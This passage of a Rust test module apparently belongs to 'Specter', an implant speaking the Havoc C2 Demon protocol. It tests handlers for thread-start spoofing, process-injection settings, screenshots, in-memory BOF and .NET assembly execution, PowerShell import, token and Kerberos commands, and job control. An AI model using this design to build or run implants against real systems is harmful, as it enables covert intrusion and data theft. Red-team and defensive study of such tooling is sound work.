        let payload = config_payload(u32::from(DemonConfigKey::WorkingHours), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.working_hours, Some(0x00FF_FF00u32 as i32));
    }

    #[test]
    fn config_spf_thread_addr_updates() {
        let mut config = SpecterConfig::default();
        // Build: [key][lib_len][lib_bytes\0][func_len][func_bytes\0][offset]
        let lib = b"ntdll.dll\0";
        let func = b"RtlUserThreadStart\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
        extra.extend_from_slice(func);
        extra.extend_from_slice(&0x10u32.to_le_bytes());
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(
            config.spf_thread_addr,
            Some(("ntdll.dll".to_string(), "RtlUserThreadStart".to_string(), 0x10))
        );
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSpfThreadStart));
    }

    #[test]
    fn config_inject_spoof_addr_updates() {
        let mut config = SpecterConfig::default();
        let lib = b"kernel32.dll\0";
        let func = b"CreateThread\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
        extra.extend_from_slice(func);
        extra.extend_from_slice(&0x20u32.to_le_bytes());
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpoofAddr), &extra);
        handle_config(&payload, &mut config);

        assert_eq!(
            config.inject_spoof_addr,
            Some(("kernel32.dll".to_string(), "CreateThread".to_string(), 0x20))
        );
    }

    #[test]
    fn config_addr_missing_function_ignored() {
        let mut config = SpecterConfig::default();
        let lib = b"ntdll.dll\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        // No function or offset follows.
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_spawn64_updates() {
        let mut config = SpecterConfig::default();
        // The server sends the path as length-prefixed UTF-16LE bytes.
        let path_str = "C:\\Windows\\System32\\notepad.exe";
        let utf16: Vec<u8> = path_str
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut extra = Vec::new();
        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        extra.extend_from_slice(&utf16);
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.spawn64.as_deref(), Some(path_str));
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::InjectSpawn64));
    }

    #[test]
    fn config_spawn32_updates() {
        let mut config = SpecterConfig::default();
        let path_str = "C:\\Windows\\SysWOW64\\cmd.exe";
        let utf16: Vec<u8> = path_str
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut extra = Vec::new();
        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        extra.extend_from_slice(&utf16);
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn32), &extra);
        handle_config(&payload, &mut config);

        assert_eq!(config.spawn32.as_deref(), Some(path_str));
    }

    #[test]
    fn config_spawn_missing_bytes_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_u32_missing_value_ignored() {
        let mut config = SpecterConfig::default();
        // Key with no value bytes.
        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_dispatch_routes_correctly() {
        let extra = 1u32.to_le_bytes();
        let inner = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandConfig),
            request_id: 42,
            payload: inner,
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        assert!(config.verbose);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
    }

    // ── CommandScreenshot (2510) ────────────────────────────────────────────

    #[test]
    fn screenshot_returns_respond_with_correct_command_id() {
        let result = handle_screenshot();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
    }

    #[test]
    fn screenshot_response_starts_with_success_flag() {
        let result = handle_screenshot();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // On non-Windows (CI) the stub returns None → success=0.
        // On Windows the GDI call should succeed → success=1.
        assert!(resp.payload.len() >= 4, "payload must contain at least the success flag");
        let success = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        if cfg!(windows) {
            assert_eq!(success, 1, "screenshot must succeed on Windows");
            // Verify the image bytes are present after the success flag.
            assert!(resp.payload.len() > 8, "payload must contain image data");
            let img_len = u32::from_le_bytes(resp.payload[4..8].try_into().unwrap());
            assert!(img_len > 0, "image length must be non-zero");
            assert_eq!(
                resp.payload.len(),
                8 + img_len as usize,
                "payload length must match header + image bytes"
            );
            // BMP magic: first two bytes of image data should be 'BM'.
            assert_eq!(resp.payload[8], b'B', "BMP magic byte 0");
            assert_eq!(resp.payload[9], b'M', "BMP magic byte 1");
        } else {
            assert_eq!(success, 0, "screenshot must fail on non-Windows stub");
            assert_eq!(resp.payload.len(), 4, "failure payload is just the flag");
        }
    }

    #[test]
    fn screenshot_dispatch_routes_correctly() {
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandScreenshot),
            request_id: 99,
            payload: Vec::new(),
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
    }

    // ── CommandInlineExecute (20) ───────────────────────────────────────────

    #[test]
    fn inline_execute_short_payload_returns_could_not_run() {
        let result = handle_inline_execute(
            &[],
            1,
            &SpecterConfig::default(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
        // Payload should start with BOF_COULD_NOT_RUN (4)
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
    }

    #[test]
    fn inline_execute_missing_memfile_returns_could_not_run() {
        // Valid payload structure but memfile IDs don't exist
        let mut payload = Vec::new();
        // function_name: "go"
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        // bof_file_id
        payload.extend_from_slice(&99u32.to_le_bytes());
        // params_file_id
        payload.extend_from_slice(&100u32.to_le_bytes());
        // flags
        payload.extend_from_slice(&0u32.to_le_bytes());

        let result = handle_inline_execute(
            &payload,
            1,
            &SpecterConfig::default(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
    }

    #[test]
    fn inline_execute_incomplete_memfile_returns_could_not_run() {
        let mut mem_files = MemFileStore::new();
        // Insert an incomplete memfile
        mem_files.insert(1, MemFile { expected_size: 100, data: vec![0u8; 50] });

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&1u32.to_le_bytes()); // bof_file_id
        payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id
        payload.extend_from_slice(&0u32.to_le_bytes()); // flags

        let result = handle_inline_execute(
            &payload,
            1,
            &SpecterConfig::default(),
            &mut mem_files,
            &mut JobStore::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
        // Memfiles should be cleaned up
        assert!(!mem_files.contains_key(&1));
    }

    #[test]
    fn inline_execute_with_valid_memfiles_attempts_execution() {
        let mut mem_files = MemFileStore::new();
        // Insert complete memfiles (garbage COFF data — execution will fail)
        mem_files.insert(1, MemFile { expected_size: 4, data: vec![0xDE, 0xAD, 0xBE, 0xEF] });
        mem_files.insert(2, MemFile { expected_size: 0, data: Vec::new() });

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&1u32.to_le_bytes());
        payload.extend_from_slice(&2u32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());

        let result = handle_inline_execute(
            &payload,
            1,
            &SpecterConfig::default(),
            &mut mem_files,
            &mut JobStore::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Should get some kind of response (BOF_COULD_NOT_RUN on invalid COFF)
        match result {
            DispatchResult::Respond(resp) => {
                assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
            }
            DispatchResult::MultiRespond(resps) => {
                assert!(!resps.is_empty());
                assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandInlineExecute));
            }
            _ => panic!("expected Respond or MultiRespond"),
        }
        // Memfiles should be cleaned up
        assert!(!mem_files.contains_key(&1));
        assert!(!mem_files.contains_key(&2));
    }

    // ── CommandJob (21) ─────────────────────────────────────────────────────

    #[test]
    fn job_list_empty_store_returns_header_only() {
        let mut store = JobStore::new();
        let payload = 1u32.to_le_bytes().to_vec(); // List = 1
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
        // Payload: [1: u32 LE] — just the subcommand, no jobs
        assert_eq!(resp.payload.len(), 4);
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd, 1);
    }

    #[test]
    fn job_list_with_jobs_includes_all_entries() {
        let mut store = JobStore::new();
        store.add(crate::job::JOB_TYPE_THREAD, 0, 0);
        store.add(crate::job::JOB_TYPE_PROCESS, 0, 0);

        let payload = 1u32.to_le_bytes().to_vec();
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Payload: [1: u32] + 2 * [job_id: u32, type: u32, state: u32] = 4 + 24 = 28
        assert_eq!(resp.payload.len(), 28);
    }

    #[test]
    fn job_suspend_nonexistent_returns_failure() {
        let mut store = JobStore::new();
        let mut payload = Vec::new();
        payload.extend_from_slice(&2u32.to_le_bytes()); // Suspend = 2
        payload.extend_from_slice(&999u32.to_le_bytes()); // nonexistent job
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // [2: u32][999: u32][0: u32 (false)]
        assert_eq!(resp.payload.len(), 12);
        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
        assert_eq!(success, 0);
    }

    #[test]
    fn job_kill_existing_returns_success() {
        let mut store = JobStore::new();
        let id = store.add(crate::job::JOB_TYPE_THREAD, 0, 0);
        let mut payload = Vec::new();
        payload.extend_from_slice(&4u32.to_le_bytes()); // KillRemove = 4
        payload.extend_from_slice(&id.to_le_bytes());
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
        assert_eq!(success, 1);
    }

    #[test]
    fn job_unknown_subcommand_returns_ignore() {
        let mut store = JobStore::new();
        let payload = 99u32.to_le_bytes().to_vec();
        let result = handle_job(&payload, &mut store);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn job_short_payload_returns_ignore() {
        let mut store = JobStore::new();
        let result = handle_job(&[0x01], &mut store);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── CommandPsImport (0x1011) ────────────────────────────────────────────

    #[test]
    fn ps_import_stores_script_and_responds_success() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();

        // Stage script in memfile
        let script = b"Write-Host 'Hello'";
        mem_files.insert(42, MemFile { expected_size: script.len(), data: script.to_vec() });

        let payload = 42u32.to_le_bytes().to_vec(); // memfile ID
        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
        assert_eq!(ps_scripts, script.to_vec());
        // Response should contain empty string (success)
        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(out_len, 0);
    }

    #[test]
    fn ps_import_missing_memfile_uses_raw_payload() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();

        // Payload: [memfile_id: u32][raw script bytes]
        let mut payload = Vec::new();
        payload.extend_from_slice(&99u32.to_le_bytes()); // nonexistent memfile
        payload.extend_from_slice(b"Get-Process");

        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
        assert_eq!(ps_scripts, b"Get-Process".to_vec());
    }

    #[test]
    fn ps_import_empty_script_returns_error() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();
        mem_files.insert(1, MemFile { expected_size: 0, data: Vec::new() });

        let payload = 1u32.to_le_bytes().to_vec();
        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Should contain non-empty error message
        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert!(out_len > 0);
    }

    // ── CommandAssemblyInlineExecute (0x2001) ───────────────────────────────

    #[test]
    fn assembly_inline_execute_short_payload_returns_failed() {
        let result = handle_assembly_inline_execute(&[], &mut HashMap::new());
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyInlineExecute));
        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
    }

    #[test]
    fn assembly_inline_execute_missing_memfile_returns_failed() {
        let mut mem_files = MemFileStore::new();

        // Build payload with valid wstrings but nonexistent memfile
        let mut payload = Vec::new();
        // pipe_name
        let pipe_utf16: Vec<u8> = "pipe"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&pipe_utf16);
        // app_domain
        let domain_utf16: Vec<u8> = "dom"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(domain_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&domain_utf16);
        // net_version
        let ver_utf16: Vec<u8> = "v4.0"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(ver_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&ver_utf16);
        // memfile_id (nonexistent)
        payload.extend_from_slice(&999u32.to_le_bytes());

        let result = handle_assembly_inline_execute(&payload, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
    }

    // ── CommandAssemblyListVersions (0x2003) ────────────────────────────────

    #[test]
    fn assembly_list_versions_returns_respond() {
        let result = handle_assembly_list_versions();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
        // On non-Windows, payload will be empty (no CLR versions)
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 0);
    }

    // ── Full dispatch routing tests for new commands ────────────────────────

    #[test]
    fn dispatch_routes_command_job() {
        let mut config = SpecterConfig::default();
        let payload = 1u32.to_le_bytes().to_vec(); // List
        let package = DemonPackage::new(DemonCommand::CommandJob, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
    }

    #[test]
    fn dispatch_routes_command_assembly_list_versions() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandAssemblyListVersions, 1, Vec::new());
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
    }

    // ── CommandPackageDropped ────────────────────────────────────────────────

    #[test]
    fn dispatch_routes_package_dropped_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(0x20000, 0x10000); // dropped=128KB, max=64KB
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn package_dropped_marks_matching_downloads_for_removal() {
        let mut config = SpecterConfig::default();
        let mut downloads = DownloadTracker::new();

        // Create a temp file to register as a download.
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_pkg_drop_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write temp");
        let file = std::fs::File::open(&path).expect("open temp");
        let file_id = downloads.add(file, 99, 4); // request_id=99

        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));

        // The download should now be marked for removal.
        let entry = downloads.get(file_id).expect("entry should still exist before push");
        assert_eq!(entry.state, DownloadState::Remove);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn package_dropped_removes_matching_memfile() {
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files.insert(55, MemFile { expected_size: 1024, data: vec![0u8; 512] });

        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 55, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(mem_files.get(&55).is_none(), "mem-file should have been removed");
    }

    #[test]
    fn package_dropped_ignores_short_payload() {
        let mut config = SpecterConfig::default();
        let payload = vec![0x00, 0x01, 0x00]; // only 3 bytes, not enough for two u32s
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn package_dropped_does_not_affect_unrelated_downloads() {
        let mut config = SpecterConfig::default();
        let mut downloads = DownloadTracker::new();

        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_pkg_drop_unrel_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write temp");
        let file = std::fs::File::open(&path).expect("open temp");
        let file_id = downloads.add(file, 100, 4); // request_id=100

        // Package dropped for request_id=99 — should NOT affect download with request_id=100.
        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
        dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );

        let entry = downloads.get(file_id).expect("entry should exist");
        assert_eq!(entry.state, DownloadState::Running);
        let _ = std::fs::remove_file(path);
    }

    // ── Dispatch routing completeness ────────────────────────────────────────

    #[test]
    fn dispatch_routes_command_sleep() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(500, 10);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_fs_pwd() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(u32::from(DemonFilesystemCommand::GetPwd));
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_proc_list() {
        let mut config = SpecterConfig::default();
        let payload = 0u32.to_le_bytes().to_vec(); // process_ui = 0
        let package = DemonPackage::new(DemonCommand::CommandProcList, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_net_domain() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(1); // DemonNetCommand::Domain = 1
        let package = DemonPackage::new(DemonCommand::CommandNet, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_token_getuid() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(6); // GetUid = 6
        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_config() {
        let mut config = SpecterConfig::default();
        // Config key 0 (Sleep) + u32 value
        let mut payload = Vec::new();
        payload.extend_from_slice(&0u32.to_le_bytes()); // key = Sleep
        payload.extend_from_slice(&42u32.to_le_bytes()); // value
        let package = DemonPackage::new(DemonCommand::CommandConfig, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        // Config handler returns Ignore for most valid updates (no response ack).
        // Just verify it doesn't panic.
        let _ = result;
    }

    #[test]
    fn dispatch_routes_command_screenshot() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandScreenshot, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_kerberos() {
        let mut config = SpecterConfig::default();
        // Kerberos subcommand 0 = Luid
        let payload = le_subcmd(0);
        let package = DemonPackage::new(DemonCommand::CommandKerberos, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn dispatch_routes_command_output_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandOutput, 1, vec![0xAA]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "CommandOutput from server must be ignored"
        );
    }

    #[test]
    fn dispatch_routes_beacon_output_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::BeaconOutput, 1, vec![0xBB]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "BeaconOutput from server must be ignored"
        );
    }

    #[test]
    fn dispatch_routes_command_get_job_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandGetJob, 1, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "CommandGetJob from server must be ignored"
        );
    }

    // ── CommandPivot is handled outside dispatch() ─────────────────────────────

    #[test]
    fn dispatch_command_pivot_returns_ignore() {
        // CommandPivot is intercepted by the agent run-loop (agent.rs) before
        // dispatch() is called and routed to PivotState::handle_command().
        // If it somehow reaches dispatch(), it should be safely ignored.
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandPivot, 42, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        assert!(
            matches!(result, DispatchResult::Ignore),
            "CommandPivot must be Ignore in dispatch — it is handled in agent.rs"
        );
    }

    // ── unimplemented command error response ─────────────────────────────────

    #[test]
    fn dispatch_unhandled_command_returns_beacon_output_error_message() {
        // DemonInfo is a server-side-only identifier — it falls into the `_` arm.
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::DemonInfo, 42, vec![]);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
            &crate::coffeeldr::new_bof_output_queue(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got something else — operator task would hang forever");
        };
        assert_eq!(
            resp.command_id,
            u32::from(DemonCommand::BeaconOutput),
            "unimplemented command response must use BeaconOutput"
        );
